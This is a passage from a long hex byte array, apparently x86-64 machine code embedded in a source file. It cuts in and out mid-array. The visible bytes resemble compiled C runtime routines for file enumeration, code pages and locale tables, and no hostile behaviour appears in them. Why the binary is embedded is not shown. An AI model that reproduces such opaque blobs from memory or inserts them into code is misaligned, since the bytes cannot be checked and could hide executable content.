0xf6, 0x41, 0x80, 0xf8, 0x2d, 0x77, 0xc, 0x49, 0xf, 0xbe, 0xc0, 0x48, 0xf, 0xa3, 0xc3, 0xb0, 0x1, 0x72, 0x3, 0x41, 0x8a, 0xc6, 0x48, 0x2b, 0xd7, 0x4c, 0x89, 0x74, 0x24, 0x40, 0x48, 0xff, 0xc2, 0x4c, 0x89, 0x74, 0x24, 0x48, 0xf6, 0xd8, 0x4c, 0x89, 0x74, 0x24, 0x50, 0x48, 0x8d, 0x4c, 0x24, 0x70, 0x4c, 0x89, 0x74, 0x24, 0x58, 0x4d, 0x1b, 0xed, 0x4c, 0x89, 0x74, 0x24, 0x60, 0x4c, 0x23, 0xea, 0x44, 0x88, 0x74, 0x24, 0x68, 0x33, 0xd2, 0x4c, 0x89, 0x6c, 0x24, 0x38, 0xe8, 0x6e, 0x2, 0x0, 0x0, 0x48, 0x8b, 0x44, 0x24, 0x78, 0xb9, 0xe9, 0xfd, 0x0, 0x0, 0x39, 0x48, 0xc, 0x75, 0x17, 0x44, 0x38, 0x75, 0x88, 0x74, 0xc, 0x48, 0x8b, 0x44, 0x24, 0x70, 0x83, 0xa0, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x44, 0x8b, 0xc9, 0xeb, 0x38, 0xe8, 0xd7, 0x15, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x1a, 0x44, 0x38, 0x75, 0x88, 0x74, 0xc, 0x48, 0x8b, 0x44, 0x24, 0x70, 0x83, 0xa0, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x41, 0xb9, 0x1, 0x0, 0x0, 0x0, 0xeb, 0x15, 0x44, 0x38, 0x75, 0x88, 0x74, 0xc, 0x48, 0x8b, 0x44, 0x24, 0x70, 0x83, 0xa0, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x45, 0x8b, 0xce, 0x4c, 0x8d, 0x44, 0x24, 0x30, 0x48, 0x8b, 0xcf, 0x48, 0x8d, 0x54, 0x24, 0x40, 0xe8, 0xda, 0xf7, 0xff, 0xff, 0x48, 0x8b, 0x4c, 0x24, 0x50, 0x4c, 0x8d, 0x45, 0xe0, 0x85, 0xc0, 0x44, 0x89, 0x74, 0x24, 0x28, 0x4c, 0x89, 0x74, 0x24, 0x20, 0x49, 0xf, 0x45, 0xce, 0x45, 0x33, 0xc9, 0x33, 0xd2, 0xff, 0x15, 0xf6, 0x7c, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x83, 0xf8, 0xff, 0x75, 0x2a, 0x4d, 0x8b, 0xcc, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x48, 0x8b, 0xcf, 0xe8, 0xe9, 0xfc, 0xff, 0xff, 0x8b, 0xd8, 0x44, 0x38, 0x74, 0x24, 0x68, 0x74, 0xa, 0x48, 0x8b, 0x4c, 0x24, 0x50, 0xe8, 0x3a, 0xf7, 0xff, 0xff, 0x8b, 0xc3, 0xe9, 0x83, 0x1, 0x0, 0x0, 0x49, 0x8b, 0x74, 0x24, 0x8, 0x49, 0x2b, 0x34, 0x24, 0x48, 0xc1, 0xfe, 0x3, 0x33, 0xd2, 0x4c, 0x89, 0x75, 0xb0, 0x48, 0x8d, 0x4d, 0x90, 0x4c, 0x89, 0x75, 0xb8, 0x4c, 0x89, 0x75, 0xc0, 0x4c, 0x89, 0x75, 0xc8, 0x4c, 0x89, 0x75, 0xd0, 0x44, 0x88, 0x75, 0xd8, 0xe8, 0x77, 0x1, 0x0, 0x0, 0x48, 0x8b, 0x45, 0x98, 0xb9, 0xe9, 0xfd, 0x0, 0x0, 0x39, 0x48, 0xc, 0x75, 0x16, 0x44, 0x38, 0x75, 0xa8, 0x74, 0xb, 0x48, 0x8b, 0x45, 0x90, 0x83, 0xa0, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x44, 0x8b, 0xc9, 0xeb, 0x36, 0xe8, 0xe2, 0x14, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x19, 0x44, 0x38, 0x75, 0xa8, 0x74, 0xb, 0x48, 0x8b, 0x45, 0x90, 0x83, 0xa0, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x41, 0xb9, 0x1, 0x0, 0x0, 0x0, 0xeb, 0x14, 0x44, 0x38, 0x75, 0xa8, 0x74, 0xb, 0x48, 0x8b, 0x45, 0x90, 0x83, 0xa0, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x45, 0x8b, 0xce, 0x4c, 0x8d, 0x44, 0x24, 0x30, 0x48, 0x8d, 0x55, 0xb0, 0x48, 0x8d, 0x4d, 0xc, 0xe8, 0x63, 0xf8, 0xff, 0xff, 0x4c, 0x8b, 0x75, 0xc0, 0x33, 0xd2, 0x85, 0xc0, 0x49, 0x8b, 0xce, 0x48, 0xf, 0x45, 0xca, 0x80, 0x39, 0x2e, 0x75, 0x1f, 0x8a, 0x41, 0x1, 0x84, 0xc0, 0x75, 0xf, 0x38, 0x55, 0xd8, 0x74, 0x3a, 0x49, 0x8b, 0xce, 0xe8, 0x6f, 0xf6, 0xff, 0xff, 0xeb, 0x30, 0x3c, 0x2e, 0x75, 0x5, 0x38, 0x51, 0x2, 0x74, 0xe8, 0x4d, 0x8b, 0xcc, 0x4d, 0x8b, 0xc5, 0x48, 0x8b, 0xd7, 0xe8, 0xf2, 0xfb, 0xff, 0xff, 0x44, 0x8b, 0xe8, 0x85, 0xc0, 0x75, 0x74, 0x38, 0x45, 0xd8, 0x74, 0x8, 0x49, 0x8b, 0xce, 0xe8, 0x42, 0xf6, 0xff, 0xff, 0x4c, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x8d, 0x55, 0xe0, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0xc8, 0x7b, 0x0, 0x0, 0x45, 0x33, 0xf6, 0x85, 0xc0, 0xf, 0x85, 0xff, 0xfe, 0xff, 0xff, 0x49, 0x8b, 0x4, 0x24, 0x49, 0x8b, 0x54, 0x24, 0x8, 0x48, 0x2b, 0xd0, 0x48, 0xc1, 0xfa, 0x3, 0x48, 0x3b, 0xf2, 0x74, 0x17, 0x48, 0x2b, 0xd6, 0x48, 0x8d, 0xc, 0xf0, 0x4c, 0x8d, 0xd, 0x3e, 0xf6, 0xff, 0xff, 0x45, 0x8d, 0x46, 0x8, 0xe8, 0x69, 0x2a, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0x78, 0x7b, 0x0, 0x0, 0x44, 0x38, 0x74, 0x24, 0x68, 0x74, 0xa, 0x48, 0x8b, 0x4c, 0x24, 0x50, 0xe8, 0xdf, 0xf5, 0xff, 0xff, 0x33, 0xc0, 0xeb, 0x2b, 0x80, 0x7d, 0xd8, 0x0, 0x74, 0x8, 0x49, 0x8b, 0xce, 0xe8, 0xcd, 0xf5, 0xff, 0xff, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0x4c, 0x7b, 0x0, 0x0, 0x80, 0x7c, 0x24, 0x68, 0x0, 0x74, 0xa, 0x48, 0x8b, 0x4c, 0x24, 0x50, 0xe8, 0xb3, 0xf5, 0xff, 0xff, 0x41, 0x8b, 0xc5, 0x48, 0x8b, 0x8d, 0x30, 0x2, 0x0, 0x0, 0x48, 0x33, 0xcc, 0xe8, 0x31, 0x69, 0x0, 0x0, 0x48, 0x81, 0xc4, 0x40, 0x3, 0x0, 0x0, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5b, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0xc6, 0x41, 0x18, 0x0, 0x48, 0x8b, 0xf9, 0x48, 0x8d, 0x71, 0x8, 0x48, 0x85, 0xd2, 0x74, 0x5, 0xf, 0x10, 0x2, 0xeb, 0x10, 0x83, 0x3d, 0xd9, 0x30, 0x1, 0x0, 0x0, 0x75, 0xd, 0xf, 0x10, 0x5, 0x60, 0x21, 0x1, 0x0, 0xf3, 0xf, 0x7f, 0x6, 0xeb, 0x4e, 0xe8, 0x9d, 0xeb, 0xff, 0xff, 0x48, 0x89, 0x7, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0x88, 0x90, 0x0, 0x0, 0x0, 0x48, 0x89, 0xe, 0x48, 0x8b, 0x88, 0x88, 0x0, 0x0, 0x0, 0x48, 0x89, 0x4f, 0x10, 0x48, 0x8b, 0xc8, 0xe8, 0x5a, 0x22, 0x0, 0x0, 0x48, 0x8b, 0xf, 0x48, 0x8d, 0x57, 0x10, 0xe8, 0xba, 0x22, 0x0, 0x0, 0x48, 0x8b, 0xf, 0x8b, 0x81, 0xa8, 0x3, 0x0, 0x0, 0xa8, 0x2, 0x75, 0xd, 0x83, 0xc8, 0x2, 0x89, 0x81, 0xa8, 0x3, 0x0, 0x0, 0xc6, 0x47, 0x18, 0x1, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0xc7, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xe9, 0x43, 0xf8, 0xff, 0xff, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x40, 0x33, 0xed, 0x41, 0x8b, 0xf1, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf9, 0x48, 0x85, 0xc9, 0x75, 0x1b, 0x40, 0x38, 0x6a, 0x28, 0x74, 0x4, 0x40, 0x88, 0x6a, 0x28, 0x48, 0x89, 0x6a, 0x10, 0x48, 0x89, 0x6a, 0x18, 0x48, 0x89, 0x6a, 0x20, 0xe9, 0xc3, 0x0, 0x0, 0x0, 0x66, 0x39, 0x29, 0x75, 0x34, 0x48, 0x39, 0x6a, 0x18, 0x75, 0x25, 0x40, 0x38, 0x6a, 0x28, 0x74, 0x4, 0x40, 0x88, 0x6a, 0x28, 0xe8, 0xf7, 0xf3, 0xff, 0xff, 0xb9, 0x22, 0x0, 0x0, 0x0, 0x89, 0x8, 0x8b, 0xc1, 0x40, 0x88, 0x6b, 0x28, 0x48, 0x89, 0x6b, 0x18, 0xe9, 0x95, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x42, 0x10, 0x40, 0x88, 0x28, 0xeb, 0xbe, 0x48, 0x89, 0x6c, 0x24, 0x38, 0x41, 0x83, 0xc9, 0xff, 0x48, 0x89, 0x6c, 0x24, 0x30, 0x4c, 0x8b, 0xc7, 0x89, 0x6c, 0x24, 0x28, 0x33, 0xd2, 0x8b, 0xce, 0x48, 0x89, 0x6c, 0x24, 0x20, 0xe8, 0xe5, 0xd, 0x0, 0x0, 0x48, 0x63, 0xd0, 0x85, 0xc0, 0x75, 0x16, 0xff, 0x15, 0x10, 0x79, 0x0, 0x0, 0x8b, 0xc8, 0xe8, 0x15, 0xf3, 0xff, 0xff, 0xe8, 0x9c, 0xf3, 0xff, 0xff, 0x8b, 0x0, 0xeb, 0x4c, 0x48, 0x8b, 0x4b, 0x18, 0x48, 0x3b, 0xd1, 0x76, 0xc, 0x40, 0x38, 0x6b, 0x28, 0x74, 0x8d, 0x40, 0x88, 0x6b, 0x28, 0xeb, 0x87, 0x48, 0x8b, 0x43, 0x10, 0x41, 0x83, 0xc9, 0xff, 0x48, 0x89, 0x6c, 0x24, 0x38, 0x4c, 0x8b, 0xc7, 0x48, 0x89, 0x6c, 0x24, 0x30, 0x33, 0xd2, 0x89, 0x4c, 0x24, 0x28, 0x8b, 0xce, 0x48, 0x89, 0x44, 0x24, 0x20, 0xe8, 0x8c, 0xd, 0x0, 0x0, 0x48, 0x98, 0x48, 0x85, 0xc0, 0x74, 0xa7, 0x48, 0xff, 0xc8, 0x48, 0x89, 0x43, 0x20, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x50, 0x48, 0x8b, 0x6c, 0x24, 0x58, 0x48, 0x8b, 0x74, 0x24, 0x60, 0x48, 0x83, 0xc4, 0x40, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x10, 0x48, 0x89, 0x7c, 0x24, 0x18, 0x55, 0x48, 0x8d, 0xac, 0x24, 0x60, 0xfe, 0xff, 0xff, 0x48, 0x81, 0xec, 0xa0, 0x2, 0x0, 0x0, 0x48, 0x8b, 0x5, 0xcb, 0x18, 0x1, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x85, 0x90, 0x1, 0x0, 0x0, 0x41, 0x8b, 0xf8, 0x48, 0x8b, 0xda, 0x41, 0xb8, 0x5, 0x1, 0x0, 0x0, 0x48, 0x8d, 0x55, 0x80, 0xff, 0x15, 0xfb, 0x78, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x14, 0xff, 0x15, 0x51, 0x78, 0x0, 0x0, 0x8b, 0xc8, 0xe8, 0x56, 0xf2, 0xff, 0xff, 0x33, 0xc0, 0xe9, 0xa4, 0x0, 0x0, 0x0, 0x48, 0x83, 0x64, 0x24, 0x68, 0x0, 0x48, 0x8d, 0x4c, 0x24, 0x28, 0x48, 0x8b, 0xc7, 0x48, 0x89, 0x5c, 0x24, 0x48, 0x33, 0xd2, 0x48, 0x89, 0x44, 0x24, 0x50, 0x48, 0x89, 0x44, 0x24, 0x60, 0x48, 0x89, 0x5c, 0x24, 0x58, 0xc6, 0x44, 0x24, 0x70, 0x0, 0xe8, 0xb9, 0xfd, 0xff, 0xff, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x41, 0xb9, 0xe9, 0xfd, 0x0, 0x0, 0x44, 0x39, 0x48, 0xc, 0x75, 0x15, 0x80, 0x7c, 0x24, 0x40, 0x0, 0x74, 0x47, 0x48, 0x8b, 0x44, 0x24, 0x28, 0x83, 0xa0, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0xeb, 0x39, 0xe8, 0x22, 0x11, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x1a, 0x38, 0x44, 0x24, 0x40, 0x74, 0xc, 0x48, 0x8b, 0x44, 0x24, 0x28, 0x83, 0xa0, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x41, 0xb9, 0x1, 0x0, 0x0, 0x0, 0xeb, 0x16, 0x80, 0x7c, 0x24, 0x40, 0x0, 0x74, 0xc, 0x48, 0x8b, 0x44, 0x24, 0x28, 0x83, 0xa0, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x45, 0x33, 0xc9, 0x4c, 0x8d, 0x44, 0x24, 0x20, 0x48, 0x8d, 0x54, 0x24, 0x48, 0x48, 0x8d, 0x4d, 0x80, 0xe8, 0xeb, 0xfd, 0xff, 0xff, 0x8b, 0x44, 0x24, 0x68, 0x48, 0x8b, 0x8d, 0x90, 0x1, 0x0, 0x0, 0x48, 0x33, 0xcc, 0xe8, 0x50, 0x66, 0x0, 0x0, 0x4c, 0x8d, 0x9c, 0x24, 0xa0, 0x2, 0x0, 0x0, 0x49, 0x8b, 0x5b, 0x18, 0x49, 0x8b, 0x7b, 0x20, 0x49, 0x8b, 0xe3, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x40, 0x49, 0x8b, 0xf9, 0x49, 0x8b, 0xd8, 0x8b, 0xa, 0xe8, 0x84, 0xec, 0xff, 0xff, 0x90, 0x48, 0x8b, 0x3, 0x48, 0x8b, 0x8, 0x48, 0x8b, 0x81, 0x88, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc0, 0x18, 0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0x8b, 0xd, 0x8e, 0x27, 0x1, 0x0, 0x48, 0x89, 0x4c, 0x24, 0x20, 0x48, 0x85, 0xc9, 0x74, 0x6f, 0x48, 0x85, 0xc0, 0x74, 0x5d, 0x41, 0xb8, 0x2, 0x0, 0x0, 0x0, 0x45, 0x8b, 0xc8, 0x41, 0x8d, 0x50, 0x7e, 0xf, 0x10, 0x0, 0xf, 0x11, 0x1, 0xf, 0x10, 0x48, 0x10, 0xf, 0x11, 0x49, 0x10, 0xf, 0x10, 0x40, 0x20, 0xf, 0x11, 0x41, 0x20, 0xf, 0x10, 0x48, 0x30, 0xf, 0x11, 0x49, 0x30, 0xf, 0x10, 0x40, 0x40, 0xf, 0x11, 0x41, 0x40, 0xf, 0x10, 0x48, 0x50, 0xf, 0x11, 0x49, 0x50, 0xf, 0x10, 0x40, 0x60, 0xf, 0x11, 0x41, 0x60, 0x48, 0x3, 0xca, 0xf, 0x10, 0x48, 0x70, 0xf, 0x11, 0x49, 0xf0, 0x48, 0x3, 0xc2, 0x49, 0x83, 0xe9, 0x1, 0x75, 0xb6, 0x8a, 0x0, 0x88, 0x1, 0xeb, 0x27, 0x33, 0xd2, 0x41, 0xb8, 0x1, 0x1, 0x0, 0x0, 0xe8, 0x25, 0xae, 0xff, 0xff, 0xe8, 0x58, 0xf1, 0xff, 0xff, 0xc7, 0x0, 0x16, 0x0, 0x0, 0x0, 0xe8, 0x11, 0xf0, 0xff, 0xff, 0x41, 0xb8, 0x2, 0x0, 0x0, 0x0, 0x41, 0x8d, 0x50, 0x7e, 0x48, 0x8b, 0x3, 0x48, 0x8b, 0x8, 0x48, 0x8b, 0x81, 0x88, 0x0, 0x0, 0x0, 0x48, 0x5, 0x19, 0x1, 0x0, 0x0, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8b, 0xd, 0xe4, 0x26, 0x1, 0x0, 0x48, 0x89, 0x4c, 0x24, 0x30, 0x48, 0x85, 0xc9, 0x74, 0x5e, 0x48, 0x85, 0xc0, 0x74, 0x4c, 0xf, 0x10, 0x0, 0xf, 0x11, 0x1, 0xf, 0x10, 0x48, 0x10, 0xf, 0x11, 0x49, 0x10, 0xf, 0x10, 0x40, 0x20, 0xf, 0x11, 0x41, 0x20, 0xf, 0x10, 0x48, 0x30, 0xf, 0x11, 0x49, 0x30, 0xf, 0x10, 0x40, 0x40, 0xf, 0x11, 0x41, 0x40, 0xf, 0x10, 0x48, 0x50, 0xf, 0x11, 0x49, 0x50, 0xf, 0x10, 0x40, 0x60, 0xf, 0x11, 0x41, 0x60, 0x48, 0x3, 0xca, 0xf, 0x10, 0x48, 0x70, 0xf, 0x11, 0x49, 0xf0, 0x48, 0x3, 0xc2, 0x49, 0x83, 0xe8, 0x1, 0x75, 0xb6, 0xeb, 0x1d, 0x33, 0xd2, 0x41, 0xb8, 0x0, 0x1, 0x0, 0x0, 0xe8, 0x84, 0xad, 0xff, 0xff, 0xe8, 0xb7, 0xf0, 0xff, 0xff, 0xc7, 0x0, 0x16, 0x0, 0x0, 0x0, 0xe8, 0x70, 0xef, 0xff, 0xff, 0x48, 0x8b, 0x43, 0x8, 0x48, 0x8b, 0x8, 0x48, 0x8b, 0x11, 0x83, 0xc8, 0xff, 0xf0, 0xf, 0xc1, 0x2, 0x83, 0xf8, 0x1, 0x75, 0x1b, 0x48, 0x8b, 0x43, 0x8, 0x48, 0x8b, 0x8, 0x48, 0x8d, 0x5, 0x90, 0x16, 0x1, 0x0, 0x48, 0x39, 0x1, 0x74, 0x8, 0x48, 0x8b, 0x9, 0xe8, 0x13, 0xf1, 0xff, 0xff, 0x48, 0x8b, 0x3, 0x48, 0x8b, 0x10, 0x48, 0x8b, 0x43, 0x8, 0x48, 0x8b, 0x8, 0x48, 0x8b, 0x82, 0x88, 0x0, 0x0, 0x0, 0x48, 0x89, 0x1, 0x48, 0x8b, 0x3, 0x48, 0x8b, 0x8, 0x48, 0x8b, 0x81, 0x88, 0x0, 0x0, 0x0, 0xf0, 0xff, 0x0, 0x8b, 0xf, 0xe8, 0x31, 0xeb, 0xff, 0xff, 0x48, 0x8b, 0x5c, 0x24, 0x50, 0x48, 0x83, 0xc4, 0x40, 0x5f, 0xc3, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x40, 0x8b, 0xd9, 0x33, 0xd2, 0x48, 0x8d, 0x4c, 0x24, 0x20, 0xe8, 0x38, 0xfb, 0xff, 0xff, 0x83, 0x25, 0xf5, 0x25, 0x1, 0x0, 0x0, 0x83, 0xfb, 0xfe, 0x75, 0x12, 0xc7, 0x5, 0xe6, 0x25, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0xff, 0x15, 0x58, 0x76, 0x0, 0x0, 0xeb, 0x15, 0x83, 0xfb, 0xfd, 0x75, 0x14, 0xc7, 0x5, 0xcf, 0x25, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0xff, 0x15, 0x39, 0x76, 0x0, 0x0, 0x8b, 0xd8, 0xeb, 0x17, 0x83, 0xfb, 0xfc, 0x75, 0x12, 0x48, 0x8b, 0x44, 0x24, 0x28, 0xc7, 0x5, 0xb1, 0x25, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x8b, 0x58, 0xc, 0x80, 0x7c, 0x24, 0x38, 0x0, 0x74, 0xc, 0x48, 0x8b, 0x4c, 0x24, 0x20, 0x83, 0xa1, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x40, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x33, 0xd2, 0x48, 0x83, 0xc1, 0x18, 0x41, 0xb8, 0x1, 0x1, 0x0, 0x0, 0xe8, 0x6a, 0xac, 0xff, 0xff, 0x33, 0xd2, 0x48, 0x8d, 0x7b, 0xc, 0xf, 0xb7, 0xc2, 0x4c, 0x8d, 0xd, 0x9a, 0x15, 0x1, 0x0, 0x48, 0x89, 0x53, 0x4, 0x4c, 0x8b, 0xc3, 0x48, 0x89, 0x93, 0x20, 0x2, 0x0, 0x0, 0x8d, 0x4a, 0x6, 0x66, 0xf3, 0xab, 0x48, 0x8d, 0x5, 0x97, 0x15, 0x1, 0x0, 0x8b, 0xfa, 0x4c, 0x2b, 0xc0, 0x4a, 0x8d, 0xc, 0xf, 0x48, 0xff, 0xc7, 0x8a, 0x41, 0x18, 0x41, 0x88, 0x44, 0x8, 0x30, 0x48, 0x81, 0xff, 0x1, 0x1, 0x0, 0x0, 0x7c, 0xe8, 0x48, 0x8d, 0x5, 0x74, 0x16, 0x1, 0x0, 0x48, 0x2b, 0xd8, 0x4a, 0x8d, 0xc, 0xa, 0x48, 0xff, 0xc2, 0x8a, 0x81, 0x19, 0x1, 0x0, 0x0, 0x88, 0x84, 0xb, 0x32, 0x2, 0x0, 0x0, 0x48, 0x81, 0xfa, 0x0, 0x1, 0x0, 0x0, 0x7c, 0xe3, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x10, 0x48, 0x89, 0x7c, 0x24, 0x18, 0x55, 0x48, 0x8d, 0xac, 0x24, 0x80, 0xf9, 0xff, 0xff, 0x48, 0x81, 0xec, 0x80, 0x7, 0x0, 0x0, 0x48, 0x8b, 0x5, 0xbf, 0x14, 0x1, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x85, 0x70, 0x6, 0x0, 0x0, 0x48, 0x8b, 0xf9, 0x8b, 0x49, 0x4, 0x81, 0xf9, 0xe9, 0xfd, 0x0, 0x0, 0xf, 0x84, 0x47, 0x1, 0x0, 0x0, 0x48, 0x8d, 0x54, 0x24, 0x50, 0xff, 0x15, 0x30, 0x75, 0x0, 0x0, 0x85, 0xc0, 0xf, 0x84, 0x34, 0x1, 0x0, 0x0, 0x33, 0xc0, 0x48, 0x8d, 0x4c, 0x24, 0x70, 0xbb, 0x0, 0x1, 0x0, 0x0, 0x88, 0x1, 0xff, 0xc0, 0x48, 0xff, 0xc1, 0x3b, 0xc3, 0x72, 0xf5, 0x8a, 0x44, 0x24, 0x56, 0x48, 0x8d, 0x54, 0x24, 0x56, 0xc6, 0x44, 0x24, 0x70, 0x20, 0xeb, 0x20, 0x44, 0xf, 0xb6, 0x42, 0x1, 0xf, 0xb6, 0xc8, 0xeb, 0xb, 0x3b, 0xcb, 0x73, 0xc, 0xc6, 0x44, 0xc, 0x70, 0x20, 0xff, 0xc1, 0x41, 0x3b, 0xc8, 0x76, 0xf0, 0x48, 0x83, 0xc2, 0x2, 0x8a, 0x2, 0x84, 0xc0, 0x75, 0xdc, 0x8b, 0x47, 0x4, 0x4c, 0x8d, 0x44, 0x24, 0x70, 0x83, 0x64, 0x24, 0x30, 0x0, 0x44, 0x8b, 0xcb, 0x89, 0x44, 0x24, 0x28, 0xba, 0x1, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x85, 0x70, 0x2, 0x0, 0x0, 0x33, 0xc9, 0x48, 0x89, 0x44, 0x24, 0x20, 0xe8, 0x6d, 0x2d, 0x0, 0x0, 0x83, 0x64, 0x24, 0x40, 0x0, 0x4c, 0x8d, 0x4c, 0x24, 0x70, 0x8b, 0x47, 0x4, 0x44, 0x8b, 0xc3, 0x48, 0x8b, 0x97, 0x20, 0x2, 0x0, 0x0, 0x33, 0xc9, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8d, 0x45, 0x70, 0x89, 0x5c, 0x24, 0x30, 0x48, 0x89, 0x44, 0x24, 0x28, 0x89, 0x5c, 0x24, 0x20, 0xe8, 0xf6, 0x31, 0x0, 0x0, 0x83, 0x64, 0x24, 0x40, 0x0, 0x4c, 0x8d, 0x4c, 0x24, 0x70, 0x8b, 0x47, 0x4, 0x41, 0xb8, 0x0, 0x2, 0x0, 0x0, 0x48, 0x8b, 0x97, 0x20, 0x2, 0x0, 0x0, 0x33, 0xc9, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8d, 0x85, 0x70, 0x1, 0x0, 0x0, 0x89, 0x5c, 0x24, 0x30, 0x48, 0x89, 0x44, 0x24, 0x28, 0x89, 0x5c, 0x24, 0x20, 0xe8, 0xbd, 0x31, 0x0, 0x0, 0x4c, 0x8d, 0x45, 0x70, 0x4c, 0x2b, 0xc7, 0x4c, 0x8d, 0x8d, 0x70, 0x1, 0x0, 0x0, 0x4c, 0x2b, 0xcf, 0x48, 0x8d, 0x95, 0x70, 0x2, 0x0, 0x0, 0x48, 0x8d, 0x47, 0x19, 0xf6, 0x2, 0x1, 0x74, 0xa, 0x80, 0x8, 0x10, 0x41, 0x8a, 0x4c, 0x0, 0xe7, 0xeb, 0x11, 0xf6, 0x2, 0x2, 0x74, 0xa, 0x80, 0x8, 0x20, 0x41, 0x8a, 0x4c, 0x1, 0xe7, 0xeb, 0x2, 0x32, 0xc9, 0x88, 0x88, 0x0, 0x1, 0x0, 0x0, 0x48, 0x83, 0xc2, 0x2, 0x48, 0xff, 0xc0, 0x48, 0x83, 0xeb, 0x1, 0x75, 0xcd, 0xeb, 0x3f, 0x33, 0xd2, 0x48, 0x8d, 0x4f, 0x19, 0xbb, 0x0, 0x1, 0x0, 0x0, 0x44, 0x8d, 0x42, 0x9f, 0x41, 0x8d, 0x40, 0x20, 0x83, 0xf8, 0x19, 0x77, 0x8, 0x80, 0x9, 0x10, 0x8d, 0x42, 0x20, 0xeb, 0x10, 0x41, 0x83, 0xf8, 0x19, 0x77, 0x8, 0x80, 0x9, 0x20, 0x8d, 0x42, 0xe0, 0xeb, 0x2, 0x32, 0xc0, 0x88, 0x81, 0x0, 0x1, 0x0, 0x0, 0xff, 0xc2, 0x48, 0xff, 0xc1, 0x3b, 0xd3, 0x72, 0xcc, 0x48, 0x8b, 0x8d, 0x70, 0x6, 0x0, 0x0, 0x48, 0x33, 0xcc, 0xe8, 0x7e, 0x61, 0x0, 0x0, 0x4c, 0x8d, 0x9c, 0x24, 0x80, 0x7, 0x0, 0x0, 0x49, 0x8b, 0x5b, 0x18, 0x49, 0x8b, 0x7b, 0x20, 0x49, 0x8b, 0xe3, 0x5d, 0xc3, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x70, 0x10, 0x4c, 0x89, 0x48, 0x20, 0x4c, 0x89, 0x40, 0x18, 0x55, 0x57, 0x41, 0x56, 0x48, 0x8d, 0xa8, 0x78, 0xfe, 0xff, 0xff, 0x48, 0x81, 0xec, 0x70, 0x2, 0x0, 0x0, 0x44, 0x8a, 0xf2, 0x8b, 0xd9, 0x49, 0x8b, 0xd1, 0x49, 0x8b, 0xc8, 0xe8, 0x3b, 0x2, 0x0, 0x0, 0x8b, 0xcb, 0xe8, 0xc4, 0xfc, 0xff, 0xff, 0x48, 0x8b, 0x8d, 0xa0, 0x1, 0x0, 0x0, 0x8b, 0xf8, 0x4c, 0x8b, 0x81, 0x88, 0x0, 0x0, 0x0, 0x41, 0x3b, 0x40, 0x4, 0x75, 0x7, 0x33, 0xc0, 0xe9, 0xfe, 0x1, 0x0, 0x0, 0xb9, 0x28, 0x2, 0x0, 0x0, 0xe8, 0x45, 0x1a, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x75, 0xf, 0x33, 0xc9, 0xe8, 0x66, 0xed, 0xff, 0xff, 0x83, 0xc8, 0xff, 0xe9, 0xdd, 0x1, 0x0, 0x0, 0x48, 0x8b, 0x85, 0xa0, 0x1, 0x0, 0x0, 0x48, 0x8d, 0x4c, 0x24, 0x40, 0xba, 0x4, 0x0, 0x0, 0x0, 0x44, 0x8b, 0xc2, 0x48, 0x8b, 0x80, 0x88, 0x0, 